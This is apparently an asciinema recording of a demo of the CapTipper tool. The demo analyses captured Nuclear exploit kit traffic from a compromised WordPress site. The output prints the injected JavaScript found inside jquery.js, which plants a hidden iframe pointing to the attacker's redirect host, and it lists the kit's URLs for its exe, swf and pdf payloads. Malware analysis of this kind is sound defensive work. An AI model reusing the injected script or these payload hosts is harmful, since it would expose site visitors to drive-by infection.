@@ -1,0 +1,2254 @@
+{
+  "version": 1,
+  "width": 153,
+  "height": 36,
+  "duration": 144.009748,
+  "command": "/bin/zsh",
+  "title": "",
+  "env": {
+    "TERM": "xterm-256color",
+    "SHELL": "/bin/zsh"
+  },
+  "stdout": [
+    [
+      0.081683,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                                        \r \r"
+    ],
+    [
+      0.000024,
+      "\u001b]2;omriher@Omris-MacBook-Pro: ~/Development/tmp_for_pres/CapTipper\u0007"
+    ],
+    [
+      0.000010,
+      "\u001b]1;..res/CapTipper\u0007"
+    ],
+    [
+      0.011795,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[01;32m➜ \u001b[01;32m \u001b[36mCapTipper \u001b[01;34m\u001b[01;34m \u001b[00m\u001b[K"
+    ],
+    [
+      0.000063,
+      "\u001b[?1h\u001b="
+    ],
+    [
+      0.467467,
+      "s"
+    ],
+    [
+      0.094813,
+      "\u0008su"
+    ],
+    [
+      0.152177,
+      "d"
+    ],
+    [
+      0.151889,
+      "o"
+    ],
+    [
+      0.143994,
+      " "
+    ],
+    [
+      0.128046,
+      "p"
+    ],
+    [
+      0.199878,
+      "y"
+    ],
+    [
+      0.104013,
+      "t"
+    ],
+    [
+      0.088116,
+      "h"
+    ],
+    [
+      0.079868,
+      "o"
+    ],
+    [
+      0.159752,
+      "n"
+    ],
+    [
+      0.424226,
+      " "
+    ],
+    [
+      0.304129,
+      "C"
+    ],
+    [
+      0.215912,
+      "a"
+    ],
+    [
+      0.219521,
+      "pTipper.py\u001b[1m \u001b[0m"
+    ],
+    [
+      0.749016,
+      "\u0008\u001b[0m ~"
+    ],
+    [
+      0.207324,
+      "/"
+    ],
+    [
+      0.271962,
+      "R"
+    ],
+    [
+      0.200102,
+      "e"
+    ],
+    [
+      0.159951,
+      "s"
+    ],
+    [
+      0.192011,
+      "earch\u001b[1m/\u001b[0m"
+    ],
+    [
+      0.536069,
+      "\u0008\u001b[0m/2"
+    ],
+    [
+      0.112016,
+      "0"
+    ],
+    [
+      0.095965,
+      "1"
+    ],
+    [
+      0.111716,
+      "4"
+    ],
+    [
+      0.120122,
+      "-"
+    ],
+    [
+      0.136214,
+      "1"
+    ],
+    [
+      0.127839,
+      "1"
+    ],
+    [
+      0.232012,
+      "-06-Nuclear-EK-traffic.pcap\u001b[1m \u001b[0m"
+    ],
+    [
+      0.471963,
+      "\u0008\u001b[0m \u0008"
+    ],
+    [
+      0.000056,
+      "\u001b[?1l\u001b\u003e"
+    ],
+    [
+      0.000069,
+      "\r\r\n"
+    ],
+    [
+      0.000784,
+      "\u001b]2;sudo python CapTipper.py ~/Research/2014-11-06-Nuclear-EK-traffic.pcap\u0007\u001b]1;python\u0007"
+    ],
+    [
+      0.013581,
+      "Password:"
+    ],
+    [
+      2.393123,
+      "\r\n"
+    ],
+    [
+      0.180039,
+      "CapTipper v0.2 b10 - Malicious HTTP traffic explorer tool\r\nCopyright 2015 Omri Herscovici \u003comriher@gmail.com\u003e\r\n\r\n"
+    ],
+    [
+      0.000805,
+      "[A] Analyzing PCAP: /Users/omriher/Research/2014-11-06-Nuclear-EK-traffic.pcap\r\n"
+    ],
+    [
+      0.110597,
+      "\r\n[+] Traffic Activity Time:  Thu, 11/06/14 15:02:35\r\n[+] Conversations Found:\r\n\r\n"
+    ],
+    [
+      0.000006,
+      "0: \u001b[35m / \u001b[0;0m -\u003e text/html \u001b[0;0m(0.html)\u001b[0;0m [5.4 KB]  (Magic: \u001b[1mGZ\u001b[22m)\r\n1: \u001b[35m /wp-includes/js/jquery/jquery.js?ver=1.7.2 \u001b[0;0m -\u003e application/javascript \u001b[34m(jquery.js)\u001b[0;0m [38.6 KB]  (Magic: \u001b[1mGZ\u001b[22m)\r\n"
+    ],
+    [
+      0.000010,
+      "2: \u001b[35m /seedadmin17.html \u001b[0;0m -\u003e text/html \u001b[0;0m(seedadmin17.html)\u001b[0;0m [354.0 B]  (Magic: \u001b[1mHTML\u001b[22m)\r\n"
+    ],
+    [
+      0.000027,
+      "3: \u001b[35m /wp-content/uploads/2014/01/MetroWest_COVER_Issue2_Feb2014.jpg \u001b[0;0m -\u003e image/jpeg \u001b[32m(MetroWest_COVER_Issue2_Feb2014.jpg)\u001b[0;0m [341.8 KB]  (Magic: \u001b[1mJPG\u001b[22m)\r\n"
+    ],
+    [
+      0.000019,
+      "4: \u001b[35m /15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html \u001b[0;0m -\u003e text/html \u001b[0;0m(15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html)\u001b[0;0m [110.5 KB]  (Magic: \u001b[1mHTML\u001b[22m)\r\n5: \u001b[35m /images/footer/3000melbourne.png \u001b[0;0m -\u003e image/png \u001b[32m(3000melbourne.png)\u001b[0;0m [2.9 KB]  (Magic: \u001b[1mPNG\u001b[22m)\r\n"
+    ],
+    [
+      0.000003,
+      "6: \u001b[35m /images/footer/3207portmelbourne.png \u001b[0;0m -\u003e image/png \u001b[32m(3207portmelbourne.png)\u001b[0;0m [3.0 KB]  (Magic: \u001b[1mPNG\u001b[22m)\r\n"
+    ],
+    [
+      0.000036,
+      "7: \u001b[35m /wp-content/uploads/2012/09/background1.jpg \u001b[0;0m -\u003e image/jpeg \u001b[32m(background1.jpg)\u001b[0;0m [32.3 KB]  (Magic: \u001b[1mJPG\u001b[22m)\r\n"
+    ],
+    [
+      0.000027,
+      "8: \u001b[35m /00015d76d9b2rr9f/1415286120 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(00015d76.swf)\u001b[0;0m [30.8 KB]  (Magic: \u001b[1mSWF\u001b[22m)\r\n"
+    ],
+    [
+      0.000014,
+      "9: \u001b[35m /00015d766423rr9f/1415286120 \u001b[0;0m -\u003e application/pdf \u001b[31m(XykpdWhZZ2.pdf)\u001b[0;0m [9.7 KB]  (Magic: \u001b[1mPDF\u001b[22m)\r\n"
+    ],
+    [
+      0.000079,
+      "10: \u001b[35m /00015d76rr9f/1415286120/5/x00809070554515d565b010b03510053535c0505;1;6 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(5.exe)\u001b[0;0m [136.0 KB]  (Magic: \u001b[1mEXE\u001b[22m)\r\n"
+    ],
+    [
+      0.000006,
+      "11: \u001b[35m /00015d76rr9f/1415286120/5/x00809070554515d565b010b03510053535c0505;1;6;1 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(5.exe)\u001b[0;0m [136.0 KB]  (Magic: \u001b[1mEXE\u001b[22m)\r\n12: \u001b[35m /00015d76rr9f/1415286120/7 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(7.exe)\u001b[0;0m [136.0 KB]  (Magic: \u001b[1mEXE\u001b[22m)\r\n13: \u001b[35m /00015d761709rr9f/1415286120 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(00015d76.swf)\u001b[0;0m [7.9 KB]  (Magic: \u001b[1mXAP\u001b[22m)\r\n14: \u001b[35m /00015d76rr9f/1415286120/8 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(8.exe)\u001b[0;0m [136.0 KB]  (Magic: \u001b[1mEXE\u001b[22m)\r\n\r\n"
+    ],
+    [
+      0.001063,
+      "\r\n\u001b[32m[+]\u001b[0;0m Started Web Server on http://localhost:80\r\n"
+    ],
+    [
+      0.000026,
+      "\u001b[32m[+]\u001b[0;0m Listening to requests...\r\n\r\n"
+    ],
+    [
+      0.105006,
+      "Starting CapTipper Interpreter\r\nType 'open \u003cconversation id\u003e' to open address in browser\r\nType 'hosts' to view traffic flow\r\nType 'help' for more options\r\n\r\n"
+    ],
+    [
+      0.000027,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      3.250220,
+      "h"
+    ],
+    [
+      0.047947,
+      "o"
+    ],
+    [
+      0.008203,
+      "s"
+    ],
+    [
+      0.095994,
+      "t"
+    ],
+    [
+      0.111957,
+      "s"
+    ],
+    [
+      0.839812,
+      "\r\n"
+    ],
+    [
+      0.000057,
+      "Found Hosts:\r\n"
+    ],
+    [
+      0.000005,
+      "\r\n"
+    ],
+    [
+      0.000058,
+      " www.magmedia.com.au (182.160.157.199:80)\r\n"
+    ],
+    [
+      0.000109,
+      " ├-- /   [0]\r\n"
+    ],
+    [
+      0.000007,
+      " ├-- /wp-includes/js/jquery/jquery.js?ver=1.7.2   [2]\r\n"
+    ],
+    [
+      0.000011,
+      " ├-- /wp-content/uploads/2014/01/MetroWest_COVER_Issue2_Feb2014.jpg   [4]\r\n"
+    ],
+    [
+      0.000005,
+      " ├-- /images/footer/3000melbourne.png   [5]\r\n"
+    ],
+    [
+      0.000045,
+      " ├-- /images/footer/3207portmelbourne.png   [6]\r\n └-- /wp-content/uploads/2012/09/background1.jpg   [7]\r\n\r\n\r\n pixeltouchstudios.tk (108.61.196.84:80)\r\n"
+    ],
+    [
+      0.000007,
+      " └-- /seedadmin17.html   [1]\r\n\r\n\r\n grannityrektonaver.co.vu (173.244.195.17:80)\r\n"
+    ],
+    [
+      0.000004,
+      " ├-- /15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html   [3]\r\n"
+    ],
+    [
+      0.000039,
+      " ├-- /00015d76d9b2rr9f/1415286120   [8]\r\n ├-- /00015d766423rr9f/1415286120   [9]\r\n"
+    ],
+    [
+      0.000007,
+      " ├-- /00015d76rr9f/1415286120/5/x00809070554515d565b010b03510053535c0505;1;6   [10]\r\n"
+    ],
+    [
+      0.000003,
+      " ├-- /00015d76rr9f/1415286120/5/x00809070554515d565b010b03510053535c0505;1;6;1   [11]\r\n"
+    ],
+    [
+      0.000012,
+      " ├-- /00015d76rr9f/1415286120/7   [12]\r\n"
+    ],
+    [
+      0.000004,
+      " ├-- /00015d761709rr9f/1415286120   [13]\r\n"
+    ],
+    [
+      0.000014,
+      " └-- /00015d76rr9f/1415286120/8   [14]\r\n\r\n\r\n"
+    ],
+    [
+      0.000056,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      1.759477,
+      "h"
+    ],
+    [
+      0.088201,
+      "e"
+    ],
+    [
+      0.143901,
+      "a"
+    ],
+    [
+      0.079924,
+      "d"
+    ],
+    [
+      0.152073,
+      " "
+    ],
+    [
+      0.160020,
+      "2"
+    ],
+    [
+      0.999977,
+      "\r\n"
+    ],
+    [
+      0.000112,
+      "Displaying header of object 2 (seedadmin17.html):\r\n\r\n"
+    ],
+    [
+      0.000010,
+      "HTTP/1.1 302 Found\r\nServer: nginx\r\nDate: Thu, 06 Nov 2014 15:02:38 GMT\r\nContent-Type: text/html; charset=iso-8859-1\r\nContent-Length: 354\r\nConnection: keep-alive\r\nSet-Cookie: ehihm=_YocADE3AAIAAgCvjVtU__.vjVtUQAABAAAAr41bVAA-; expires=Fri, 06-Nov-2015 15:03:11 GMT; path=/; domain=pixeltouchstudios.tk\r\nLocation: http://grannityrektonaver.co.vu/15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html\r\n"
+    ],
+    [
+      0.000064,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      1.103701,
+      "b"
+    ],
+    [
+      0.079628,
+      "o"
+    ],
+    [
+      0.144464,
+      "d"
+    ],
+    [
+      0.136008,
+      "y"
+    ],
+    [
+      0.096009,
+      " "
+    ],
+    [
+      0.175664,
+      "2"
+    ],
+    [
+      0.600266,
+      "\r\n"
+    ],
+    [
+      0.000120,
+      "Displaying body of object 2 (seedadmin17.html) [256 bytes]:\r\n\r\n\u003c!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"\u003e\r\n"
+    ],
+    [
+      0.000008,
+      "\u003chtml\u003e\u003chead\u003e\r\n\u003ctitle\u003e302 Found\u003c/title\u003e\r\n\u003c/head\u003e\u003cbody\u003e\r\n\u003ch1\u003eFound\u003c/h1\u003e\r\n\u003cp\u003eThe document has moved \u003ca href=\"http://grannityrektonaver.co.vu/15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html\"\u003ehere\u003c/a\u003e.\u003c/p\u003e\r\n\u003chr\r\n"
+    ],
+    [
+      0.000050,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      1.655807,
+      "i"
+    ],
+    [
+      0.055872,
+      "n"
+    ],
+    [
+      0.095947,
+      "f"
+    ],
+    [
+      0.096028,
+      "o"
+    ],
+    [
+      0.135946,
+      " "
+    ],
+    [
+      0.320201,
+      "2"
+    ],
+    [
+      0.551861,
+      "\r\n"
+    ],
+    [
+      0.000114,
+      "Info of conversation 2: \r\n\r\n SERVER IP   : 108.61.196.84:80\r\n"
+    ],
+    [
+      0.000018,
+      " TIME        : Thu, 11/06/14 15:02:38\r\n HOST        : pixeltouchstudios.tk\r\n"
+    ],
+    [
+      0.000005,
+      " URI         : /seedadmin17.html\r\n REFERER     : http://www.magmedia.com.au/\r\n"
+    ],
+    [
+      0.000004,
+      " METHOD      : GET\r\n"
+    ],
+    [
+      0.000003,
+      " RESULT NUM  : 302 Found\r\n"
+    ],
+    [
+      0.000004,
+      " RESULT TYPE : text/html\r\n"
+    ],
+    [
+      0.000018,
+      " FILE NAME   : seedadmin17.html\r\n"
+    ],
+    [
+      0.000007,
+      " MAGIC       : HyperText Markup Language (HTML)\r\n LENGTH      : 354 B\r\n\r\n"
+    ],
+    [
+      0.000046,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      1.623708,
+      "b"
+    ],
+    [
+      0.151824,
+      "o"
+    ],
+    [
+      0.410327,
+      "d"
+    ],
+    [
+      0.110020,
+      "y"
+    ],
+    [
+      0.095828,
+      " "
+    ],
+    [
+      0.247777,
+      "1"
+    ],
+    [
+      1.144331,
+      "\r\n"
+    ],
+    [
+      0.000129,
+      "Displaying body of object 1 (jquery.js) [256 bytes]:\r\n\r\n"
+    ],
+    [
+      0.000008,
+      "\u001f\ufffd\u0008\u0000\u0000\u0000\u0000\u0000\u0004\u0003Ľi{#Ǒ\ufffd\ufffd}~\u0005X\ufffdt\u0003\ufffd\"HJ\ufffdg\u000c\ufffd\u001ao\ufffd%Y\ufffd\ufffd\ufffd\ufffdm\ufffdCR\ufffd\r\n@a!\ufffdP\u0000؋\t\ufffdo?\ufffd\u0013\ufffdT\u0015\u0008J\ufffd\ufffd\ufffd\\g\ufffdj\ufffd\ufffd\\\"#c\ufffd\ufffd\ufffdg\ufffd\ufffdry\ufffd~5\u001dO6\ufffd\ufffd\ufffdV\ufffdÓ\ufffd\ufffdh|\ufffd*\ufffdƫ\ufffdh\ufffd6_\u0015\ufffdϗ\ufffd\ufffda\ufffd\ufffd.\u0017i\ufffd\ufffdŠݘl67\ufffd\ufffd\ufffd\ufffdz\ufffd^\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdF\ufffd\ufffd\ufffd\ufffdh\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdzZ4\ufffd\ufffdݛ|\ufffd\ufffdg\ufffd\ufffd\ufffdv^,6\ufffd\ufffd=h\ufffd\ufffd\ufffd`\ufffd\\\u0014o\u001b\ufffd\u0017\ufffd\ufffd\ufffd\ufffd4\ufffdf\ufffd\ufffd\ufffd\ufffd\ufffdh%\ufffdy{U\ufffd\ufffd\ufffdA\ufffd\u003cn\ufffd_\ufffd?\ufffd=\ufffd\ufffd\ufffd_4/Z\u0017\ufffd\u0017\ufffd\u0017\u0017\u0017\ufffd\u0017\ufffd?^\ufffd\ufffd\ufffdirq\ufffd\ufffdi\r\n"
+    ],
+    [
+      0.000047,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      0.927731,
+      "u"
+    ],
+    [
+      0.063881,
+      "n"
+    ],
+    [
+      0.175976,
+      "g"
+    ],
+    [
+      0.184171,
+      "z"
+    ],
+    [
+      0.175708,
+      "i"
+    ],
+    [
+      0.050796,
+      "p"
+    ],
+    [
+      0.101312,
+      " "
+    ],
+    [
+      0.232091,
+      "1"
+    ],
+    [
+      0.735904,
+      "\r\n"
+    ],
+    [
+      0.002318,
+      " GZIP Decompression of object 1 (jquery.js) successful!\r\n New object created: 15\r\n\r\n"
+    ],
+    [
+      0.000033,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      1.301719,
+      "b"
+    ],
+    [
+      0.119732,
+      "o"
+    ],
+    [
+      0.392204,
+      "d"
+    ],
+    [
+      0.127879,
+      "y"
+    ],
+    [
+      0.272169,
+      " "
+    ],
+    [
+      0.303908,
+      "1"
+    ],
+    [
+      0.087992,
+      "5"
+    ],
+    [
+      1.327980,
+      "\r\n"
+    ],
+    [
+      0.000106,
+      "Displaying body of object 15 (ungzip-jquery.js) [256 bytes]:\r\n"
+    ],
+    [
+      0.000007,
+      "\r\n/*\r\nCopyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/\r\n*/\r\nfunction getCookie(a){var b=document.cookie.match(new RegExp(\"(?:^|; )\"+a.replace(/([\\.$?*|{}\\(\\)\\[\\]\\\\\\/\\+^])/g,\"\\\\$1\")+\"=([^;]*)\"));return b?decodeURIComponent(b[1]):undefined}(funct\r\n"
+    ],
+    [
+      0.000055,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      1.031692,
+      "b"
+    ],
+    [
+      0.136095,
+      "o"
+    ],
+    [
+      0.136069,
+      "d"
+    ],
+    [
+      0.151793,
+      "y"
+    ],
+    [
+      0.512159,
+      " "
+    ],
+    [
+      0.119956,
+      "1"
+    ],
+    [
+      0.087942,
+      "5"
+    ],
+    [
+      0.111561,
+      " "
+    ],
+    [
+      0.680454,
+      "1"
+    ],
+    [
+      0.519919,
+      "0"
+    ],
+    [
+      0.056162,
+      "2"
+    ],
+    [
+      0.055759,
+      "4"
+    ],
+    [
+      1.000102,
+      "\r\n"
+    ],
+    [
+      0.000117,
+      "Displaying body of object 15 (ungzip-jquery.js) [1024 bytes]:\r\n"
+    ],
+    [
+      0.000150,
+      "\r\n/*\r\nCopyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/\r\n*/\r\nfunction getCookie(a){var b=document.cookie.match(new RegExp(\"(?:^|; )\"+a.replace(/([\\.$?*|{}\\(\\)\\[\\]\\\\\\/\\+^])/g,\"\\\\$1\")+\"=([^;]*)\"));return b?decodeURIComponent(b[1]):undefined}(function(){function b(i,f,g){var j=(i+\"\").toLowerCase();var e=(f+\"\").toLowerCase();var h=0;if((h=j.indexOf(e,g))!==-1){return h}return false}function d(){var f=[\"Yandex\",\"AppleWebKit\",\"Windows NT 6.3\",\"X11\",\"Phone\",\"Google\"];var g=false;for(var e in f){if(b(navigator.userAgent,f[e])){g=true;break}}return g}var c=(getCookie(\"akelbriston19ure\")===undefined);if(!d()\u0026\u0026c){document.write('\u003ciframe width=\"110\" height=\"130\" style=\"position:absolute;margin-top:-1001px;\" src=\"http://pixeltouchstudios.tk/seedadmin17.html\"\u003e\u003c/iframe\u003e');var a=new Date(new Date().getTime()+48*60*60*1000);document.cookie=\"akelbriston19ure=1; path=/; expires=\"+a.toUTCString()}})();\r\n/*\r\nCopyright (C) 2000 Free Software Foundation, Inc. See LICENSE.txt\r\n*//*! jQuery v1.7.2 jquery.com | jquery."
+    ],
+    [
+      0.000020,
+      "org/lice\r\n"
+    ],
+    [
+      0.000058,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      2.199687,
+      "i"
+    ],
+    [
+      0.111813,
+      "f"
+    ],
+    [
+      0.168220,
+      "r"
+    ],
+    [
+      0.263716,
+      "a"
+    ],
+    [
+      0.160074,
+      "m"
+    ],
+    [
+      0.096067,
+      "e"
+    ],
+    [
+      0.143910,
+      "s"
+    ],
+    [
+      0.303964,
+      " "
+    ],
+    [
+      0.536338,
+      "1"
+    ],
+    [
+      0.087855,
+      "5"
+    ],
+    [
+      0.623911,
+      "\r\n"
+    ],
+    [
+      0.000141,
+      "Searching for iframes in object 15 (ungzip-jquery.js)...\r\n"
+    ],
+    [
+      0.010004,
+      " 1 iframe(s) Found!\r\n\r\n [I] 1 : http://pixeltouchstudios.tk/seedadmin17.html\r\n\r\n"
+    ],
+    [
+      0.000020,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      1.893786,
+      "d"
+    ],
+    [
+      0.119920,
+      "u"
+    ],
+    [
+      0.191943,
+      "m"
+    ],
+    [
+      0.072054,
+      "p"
+    ],
+    [
+      0.112080,
+      " "
+    ],
+    [
+      0.079783,
+      "a"
+    ],
+    [
+      0.112155,
+      "l"
+    ],
+    [
+      0.135884,
+      "l"
+    ],
+    [
+      0.120077,
+      " "
+    ],
+    [
+      0.559887,
+      "/"
+    ],
+    [
+      0.272006,
+      "t"
+    ],
+    [
+      0.072152,
+      "m"
+    ],
+    [
+      0.063853,
+      "p"
+    ],
+    [
+      0.447917,
+      "/"
+    ],
+    [
+      0.496120,
+      "N"
+    ],
+    [
+      0.319909,
+      "u"
+    ],
+    [
+      0.151990,
+      "c"
+    ],
+    [
+      0.224166,
+      "l"
+    ],
+    [
+      0.120075,
+      "e"
+    ],
+    [
+      0.103827,
+      "a"
+    ],
+    [
+      0.135929,
+      "r"
+    ],
+    [
+      0.591994,
+      "\r\n"
+    ],
+    [
+      0.000351,
+      " Object 0 written to /tmp/Nuclear/0-0.html\r\n"
+    ],
+    [
+      0.000166,
+      " Object 1 written to /tmp/Nuclear/1-jquery.js\r\n"
+    ],
+    [
+      0.000111,
+      " Object 2 written to /tmp/Nuclear/2-seedadmin17.html\r\n"
+    ],
+    [
+      0.000698,
+      " Object 3 written to /tmp/Nuclear/3-MetroWest_COVER_Issue2_Feb2014.jpg\r\n"
+    ],
+    [
+      0.000457,
+      " Object 4 written to /tmp/Nuclear/4-15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html\r\n"
+    ],
+    [
+      0.000118,
+      " Object 5 written to /tmp/Nuclear/5-3000melbourne.png\r\n"
+    ],
+    [
+      0.000106,
+      " Object 6 written to /tmp/Nuclear/6-3207portmelbourne.png\r\n"
+    ],
+    [
+      0.000182,
+      " Object 7 written to /tmp/Nuclear/7-background1.jpg\r\n"
+    ],
+    [
+      0.000302,
+      " Object 8 written to /tmp/Nuclear/8-00015d76.swf\r\n"
+    ],
+    [
+      0.000230,
+      " Object 9 written to /tmp/Nuclear/9-XykpdWhZZ2.pdf\r\n"
+    ],
+    [
+      0.000324,
+      " Object 10 written to /tmp/Nuclear/10-5.exe\r\n"
+    ],
+    [
+      0.000346,
+      " Object 11 written to /tmp/Nuclear/11-5.exe\r\n"
+    ],
+    [
+      0.000305,
+      " Object 12 written to /tmp/Nuclear/12-7.exe\r\n"
+    ],
+    [
+      0.000088,
+      " Object 13 written to /tmp/Nuclear/13-00015d76.swf\r\n"
+    ],
+    [
+      0.000237,
+      " Object 14 written to /tmp/Nuclear/14-8.exe\r\n"
+    ],
+    [
+      0.000182,
+      " Object 15 written to /tmp/Nuclear/15-ungzip-jquery.js\r\n"
+    ],
+    [
+      0.000029,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      1.707743,
+      "c"
+    ],
+    [
+      0.104010,
+      "o"
+    ],
+    [
+      0.047947,
+      "n"
+    ],
+    [
+      0.056010,
+      "v"
+    ],
+    [
+      0.096100,
+      "s"
+    ],
+    [
+      0.231963,
+      "\r\n"
+    ],
+    [
+      0.000105,
+      "Conversations Found:\r\n\r\n"
+    ],
+    [
+      0.000035,
+      "0: \u001b[35m / \u001b[0;0m -\u003e text/html \u001b[0;0m(0.html)\u001b[0;0m [5.4 KB]  (Magic: \u001b[1mGZ\u001b[22m)\r\n"
+    ],
+    [
+      0.000006,
+      "1: \u001b[35m /wp-includes/js/jquery/jquery.js?ver=1.7.2 \u001b[0;0m -\u003e application/javascript \u001b[34m(jquery.js)\u001b[0;0m [38.6 KB]  (Magic: \u001b[1mGZ\u001b[22m)\r\n"
+    ],
+    [
+      0.000030,
+      "2: \u001b[35m /seedadmin17.html \u001b[0;0m -\u003e text/html \u001b[0;0m(seedadmin17.html)\u001b[0;0m [354.0 B]  (Magic: \u001b[1mHTML\u001b[22m)\r\n"
+    ],
+    [
+      0.000008,
+      "3: \u001b[35m /wp-content/uploads/2014/01/MetroWest_COVER_Issue2_Feb2014.jpg \u001b[0;0m -\u003e image/jpeg \u001b[32m(MetroWest_COVER_Issue2_Feb2014.jpg)\u001b[0;0m [341.8 KB]  (Magic: \u001b[1mJPG\u001b[22m)\r\n"
+    ],
+    [
+      0.000045,
+      "4: \u001b[35m /15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html \u001b[0;0m -\u003e text/html \u001b[0;0m(15c0b14drr9f_1_08282d03fb0251bbd75ff6dc6e317bd9.html)\u001b[0;0m [110.5 KB]  (Magic: \u001b[1mHTML\u001b[22m)\r\n"
+    ],
+    [
+      0.000006,
+      "5: \u001b[35m /images/footer/3000melbourne.png \u001b[0;0m -\u003e image/png \u001b[32m(3000melbourne.png)\u001b[0;0m [2.9 KB]  (Magic: \u001b[1mPNG\u001b[22m)\r\n"
+    ],
+    [
+      0.000008,
+      "6: \u001b[35m /images/footer/3207portmelbourne.png \u001b[0;0m -\u003e image/png \u001b[32m(3207portmelbourne.png)\u001b[0;0m [3.0 KB]  (Magic: \u001b[1mPNG\u001b[22m)\r\n"
+    ],
+    [
+      0.000016,
+      "7: \u001b[35m /wp-content/uploads/2012/09/background1.jpg \u001b[0;0m -\u003e image/jpeg \u001b[32m(background1.jpg)\u001b[0;0m [32.3 KB]  (Magic: \u001b[1mJPG\u001b[22m)\r\n"
+    ],
+    [
+      0.000046,
+      "8: \u001b[35m /00015d76d9b2rr9f/1415286120 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(00015d76.swf)\u001b[0;0m [30.8 KB]  (Magic: \u001b[1mSWF\u001b[22m)\r\n"
+    ],
+    [
+      0.000007,
+      "9: \u001b[35m /00015d766423rr9f/1415286120 \u001b[0;0m -\u003e application/pdf \u001b[31m(XykpdWhZZ2.pdf)\u001b[0;0m [9.7 KB]  (Magic: \u001b[1mPDF\u001b[22m)\r\n"
+    ],
+    [
+      0.000025,
+      "10: \u001b[35m /00015d76rr9f/1415286120/5/x00809070554515d565b010b03510053535c0505;1;6 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(5.exe)\u001b[0;0m [136.0 KB]  (Magic: \u001b[1mEXE\u001b[22m)\r\n"
+    ],
+    [
+      0.000017,
+      "11: \u001b[35m /00015d76rr9f/1415286120/5/x00809070554515d565b010b03510053535c0505;1;6;1 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(5.exe)\u001b[0;0m [136.0 KB]  (Magic: \u001b[1mEXE\u001b[22m)\r\n"
+    ],
+    [
+      0.000025,
+      "12: \u001b[35m /00015d76rr9f/1415286120/7 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(7.exe)\u001b[0;0m [136.0 KB]  (Magic: \u001b[1mEXE\u001b[22m)\r\n"
+    ],
+    [
+      0.000087,
+      "13: \u001b[35m /00015d761709rr9f/1415286120 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(00015d76.swf)\u001b[0;0m [7.9 KB]  (Magic: \u001b[1mXAP\u001b[22m)\r\n"
+    ],
+    [
+      0.000009,
+      "14: \u001b[35m /00015d76rr9f/1415286120/8 \u001b[0;0m -\u003e application/octet-stream \u001b[33m(8.exe)\u001b[0;0m [136.0 KB]  (Magic: \u001b[1mEXE\u001b[22m)\r\n\r\n"
+    ],
+    [
+      0.000041,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      3.055312,
+      "h"
+    ],
+    [
+      0.079887,
+      "e"
+    ],
+    [
+      0.184087,
+      "x"
+    ],
+    [
+      0.199980,
+      "d"
+    ],
+    [
+      0.079928,
+      "u"
+    ],
+    [
+      0.200037,
+      "m"
+    ],
+    [
+      0.072099,
+      "p"
+    ],
+    [
+      0.103889,
+      " "
+    ],
+    [
+      0.200026,
+      "1"
+    ],
+    [
+      0.112107,
+      "3"
+    ],
+    [
+      1.487836,
+      "\r\n"
+    ],
+    [
+      0.000133,
+      "Displaying hexdump of object 13 (00015d76.swf) body [256 bytes]:\r\n"
+    ],
+    [
+      0.000491,
+      "\r\n0000   50 4B 03 04 14 00 00 08 08 00 81 7A 5D 45 6F 8B    PK.........z]Eo.\r\n0010   BE 6C D2 00 00 00 6B 01 00 00 10 00 00 00 41 70    .l....k.......Ap\r\n0020   70 4D 61 6E 69 66 65 73 74 2E 78 61 6D 6C 85 8F    pManifest.xaml..\r\n0030   C1 4A 03 31 10 86 EF 42 DF 21 E4 01 92 50 6A 95    .J.1...B.!...Pj.\r\n0040   C5 2D 14 F4 2A A5 8A F7 98 9D DA 60 66 12 32 69    .-..*......`f.2i\r\n0050   9B 7D 36 0F 3E 92 AF E0 D6 A2 EC 61 C1 EB 37 FF    .}6.\u003e......a..7.\r\n0060   C7 C7 7C 7D 7C DE DD 43 0A B1 47 A0 22 2A 06 E2    ..|}|..C..G.\"*..\r\n0070   56 EE 4B 49 8D D6 EC F6 80 96 15 7A 97 23 C7 5D    V.KI.......z.#.]\r\n0080   51 2E A2 76 C1 0F 53 3D 37 E6 46 77 7F AA BC B8    Q..v..S=7.Fw....\r\n0090   4D FD C7 3E 79 DA D5 B3 BC D4 D5 62 90 E2 81 4A    M..\u003ey......b...J\r\n00A0   EE 37 D1 53 59 33 03 BE 86 BE 95 15 F2 D1 A2 25    .7.SY3.........%\r\n00B0   48 B0 00 7A F7 E3 D5 73 9F A0 95 96 BB 37 EE D4    H..z...s.....7..\r\n00C0   3A 25 29 B6 07 2A 1E E1 05 32 FB 48 AD 5C 28 